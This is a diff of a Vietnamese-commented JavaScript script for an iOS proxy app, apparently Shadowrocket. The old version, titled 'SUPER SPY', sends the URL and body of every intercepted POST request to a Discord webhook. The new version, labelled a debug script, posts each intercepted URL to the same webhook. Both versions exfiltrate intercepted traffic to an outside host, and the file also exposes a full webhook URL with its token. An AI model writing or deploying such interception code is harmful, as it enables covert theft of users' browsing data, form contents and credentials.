@@ -1,34 +1,34 @@
-/**
- * SUPER SPY JS - BẮT TẤT CẢ
- * Không lọc tên miền, không lọc ảnh. Có gì gửi nấy.
- */
+/* DEBUG SCRIPT: KIỂM TRA PHẢN HỒI TỪ DISCORD 
+   File: smart_spy.js
+*/
 
-var url = $request.url;
-var body = $request.body;
-var method = $request.method;
+var request = $request;
+var url = request.url;
 
-// CHỈ GỬI KHI LÀ POST (Để tránh spam quá mức chịu đựng)
-// Nếu bạn muốn bắt cả GET (xem web bình thường) thì xóa điều kiện if này đi
-if (method === "POST") {
-    sendToDiscord(url, body);
-}
+// --- DÁN LINK WEBHOOK MỚI CỦA BẠN VÀO DƯỚI ---
+var webhookUrl = "https://discordapp.com/api/webhooks/1454906156777472165/tLAGpqP0YKRK0HjgzhHat-CTb3s6OMiFrPqzse_KZ8NfD16FsgXiNmKbqxyqyaKPX1ST";
 
-$done({});
+var payload = {
+    "content": "🚨 **TEST KẾT NỐI:** Shadowrocket đã bắt được request!\nTarget: `" + url + "`"
+};
 
-function sendToDiscord(targetUrl, capturedData) {
-    // THAY WEBHOOK CỦA BẠN VÀO ĐÂY
-    var discordUrl = "https://discordapp.com/api/webhooks/1454906156777472165/tLAGpqP0YKRK0HjgzhHat-CTb3s6OMiFrPqzse_KZ8NfD16FsgXiNmKbqxyqyaKPX1ST"; 
+$httpClient.post({
+    url: webhookUrl,
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+}, function(error, response, data) {
     
-    var data = {
-        "username": "Super Spy",
-        "content": "Captured: `" + targetUrl + "`\nData: ```" + capturedData + "```"
-    };
-
-    $task.fetch({
-        url: discordUrl,
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-    }, function(){});
-}
-
+    // LOG CHI TIẾT ĐỂ BẮT LỖI
+    if (error) {
+        console.log("❌ LỖI MẠNG: " + error);
+    } else {
+        // Kiểm tra xem Discord có chấp nhận không (Status phải là 204 hoặc 200)
+        if (response.status == 204 || response.status == 200) {
+            console.log("✅ GỬI THÀNH CÔNG! (Kiểm tra Discord ngay)");
+        } else {
+            console.log("⚠️ DISCORD TỪ CHỐI! Mã lỗi: " + response.status);
+            console.log("Phản hồi từ Discord: " + data); // In ra lý do tại sao lỗi
+        }
+    }
+    $done({});
+});
